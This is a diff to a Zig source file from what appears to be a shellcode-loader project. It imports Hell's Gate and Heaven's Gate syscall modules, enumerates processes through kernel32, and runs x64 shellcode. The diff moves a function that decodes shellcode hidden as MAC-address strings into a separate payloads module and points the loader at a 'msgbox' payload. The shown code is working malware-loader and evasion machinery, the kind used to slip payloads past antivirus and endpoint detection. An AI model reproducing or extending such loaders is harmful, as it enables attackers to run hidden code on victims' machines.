@@ -1,6 +1,7 @@
 const std = @import("std");
 const hell = @import("hell.zig");
 const heaven = @import("heaven.zig");
+const payloads = @import("payloads.zig");
 const net = std.net;
 const win = std.os.windows;
 
@@ -38,24 +39,6 @@ extern "kernel32" fn Process32FirstW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) 
 extern "kernel32" fn Process32NextW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(WINAPI) BOOL;
 extern "kernel32" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;
 extern "kernel32" fn GetLastError() callconv(WINAPI) DWORD;
-
-fn macDeobfuscation(mac_array: []const []const u8, allocator: std.mem.Allocator) ![]u8 {
-    var buffer = try allocator.alloc(u8, mac_array.len * 6);
-    var offset: usize = 0;
-
-    for (mac_array) |mac| {
-        var parts = std.mem.splitScalar(u8, mac, ':');
-        var i: usize = 0;
-        while (parts.next()) |part| : (i += 1) {
-            if (i >= 6) return error.InvalidMacFormat;
-            buffer[offset + i] = std.fmt.parseInt(u8, part, 16) catch return error.InvalidHexDigit;
-        }
-        if (i != 6) return error.InvalidMacFormat;
-        offset += 6;
-    }
-
-    return buffer;
-}
 
 // Helper function to convert UTF-8 string to UTF-16 (wide string)
 fn convertToWideString(allocator: std.mem.Allocator, utf8_str: []const u8) ![]u16 {
@@ -128,8 +111,7 @@ fn runX64ShellcodeByHellsGate() !void {
     defer _ = gpa.deinit();
     const allocator = gpa.allocator();
 
-    const shellcode = try macDeobfuscation(&MAC_ARRAY, allocator);
-    defer allocator.free(shellcode);
+    const shellcode = try payloads.macDeobfuscation(&payloads.msgbox, allocator);
 
     var hell_success = false;
 
